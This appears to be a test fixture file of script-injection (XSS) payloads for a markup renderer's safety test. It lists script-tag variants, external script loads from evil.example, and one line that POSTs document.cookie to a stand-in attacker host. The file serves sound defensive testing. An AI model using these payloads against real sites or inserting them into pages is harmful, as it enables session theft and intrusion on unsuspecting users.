%% Script-injection payloads for the markup package.
%%
%% One payload per line. The test TestPayloadsRenderSafe parses each payload with
%% every mix of the three flags (Markdown, smilies, autolink), renders the tree,
%% and runs the strict HTML check on the result.
%%
%% A line that starts with "%% category:" opens a category. Every other line that
%% starts with "%%" is a comment, and a blank line is ignored. All other lines are
%% payloads, including a line that starts with "#" (a Markdown heading). A payload is read as written, with two escapes so that the file stays
%% plain ASCII and a line can hold a control character:
%%   {U+XXXX}   the code point U+XXXX, with 4 to 6 hex digits
%%   {X:hh}     one raw byte, with two hex digits (it may make invalid UTF-8)
%% A backslash is a backslash. The addresses use the reserved .example names.
%%
%% The payloads are written from public knowledge of script-injection techniques:
%% the ways that markup, attributes, URL schemes and the parser itself have been
%% used to run script in a page. Each line is a test of one idea.

%% category: script tags
<script>alert(1)</script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</sCrIpT>
<script src=https://evil.example/x.js></script>
<script src="//evil.example/x.js"></script>
<script/src=//evil.example/x.js></script>

<script{U+000B}>alert(1)</script>

<script>fetch('//evil.example',{method:'POST',body:document.cookie})</script>
